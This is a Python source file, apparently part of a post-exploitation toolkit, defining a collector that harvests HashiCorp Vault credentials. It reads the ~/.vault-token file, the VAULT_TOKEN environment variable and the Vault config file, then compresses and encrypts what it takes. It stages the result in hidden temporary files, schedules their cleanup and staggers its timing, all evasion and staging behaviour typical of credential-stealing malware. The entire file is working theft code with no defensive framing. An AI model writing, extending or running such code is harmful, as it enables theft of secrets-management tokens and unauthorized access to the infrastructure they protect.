
from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class VaultCollector(BaseCollector):
    """
    Collect HashiCorp Vault token and configuration discovery.
    
    Targets:
      - ~/.vault-token
      - VAULT_TOKEN environment variable
      - vault config file
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        # 1. Vault token file
        vault_token = Path.home() / ".vault-token"
        if vault_token.exists():
            yield ArtifactMetadata(
                artifact_family="vault_credentials",
                artifact_subtype="token_file",
                source_path=str(vault_token),
                source_platform=os.name,
                collection_method="file_read",
            )

        # 2. VAULT_TOKEN env var
        if "VAULT_TOKEN" in os.environ:
             yield ArtifactMetadata(
                artifact_family="vault_credentials",
                artifact_subtype="env_token",
                source_path="os.environ",
                source_platform=os.name,
                collection_method="api_call",
            )

        # 3. Vault config file
        vault_config = Path.home() / ".vault.d" / "config.hcl"
        if vault_config.exists():
            yield ArtifactMetadata(
                artifact_family="vault_config",
                artifact_subtype="config_hcl",
                source_path=str(vault_config),
                source_platform=os.name,
                collection_method="file_read",
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        if artifact.collection_method == "api_call":
            return self._collect_env_token(artifact)
            
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None
            
            data    = path.read_bytes()
            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "vault"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(path),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Vault artifact collection error (%s): %s", artifact.source_path, exc)
        return None

    def _collect_env_token(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        token = os.environ.get("VAULT_TOKEN", "").encode()
        if not token:
            return None
            
        sha256 = self._sha256(token)
        payload = self._compress_and_encrypt(token)
        
        stage_path = self._staging_dir / f".{sha256[:16]}.vault_env.tmp"
        stage_path.write_bytes(payload)
        self._register_cleanup(stage_path)

        record = CollectedFile(
            path       = "VAULT_TOKEN_ENV",
            sha256     = sha256,
            size_bytes = len(payload),
            metadata   = artifact,
        )
        self.persist_metadata(record)
        return record
